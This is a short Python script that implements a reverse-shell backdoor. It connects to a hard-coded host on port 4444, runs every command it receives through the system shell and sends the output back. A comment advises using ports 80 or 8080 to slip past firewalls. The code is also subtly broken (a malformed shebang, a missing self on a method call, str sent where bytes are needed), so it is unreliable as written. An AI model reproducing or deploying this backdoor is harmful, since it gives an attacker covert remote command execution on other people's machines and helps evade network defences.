#!usr/bin/env python

import socket, subprocess

def main():
    backdoor = Backdoor('10.0.1.6', 4444)
    backdoor.start()

class Backdoor:

    def __init__(self, IP, socket):
        self.IP = IP
        self.socket = socket

    def execute_command(self, command):
        return subprocess.check_output(command, shell=True)

    def start(self):
        try:
            connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            #could be good to use common ports here like 80 or 8080 to not trigger firewall
            connection.connect((self.IP, self.socket))
            connection.send('\n[+] Connection established.\n\n>>')

            while True:
                command = connection.recv(1024)
                command_result = execute_command(command)
                connection.send(f'{command_result}\n\n>>')
        except KeyboardInterrupt:
            connection.close()
            print('\n[+] Connection closed. Exiting...')
            exit()

if __name__ == '__main__':
    main()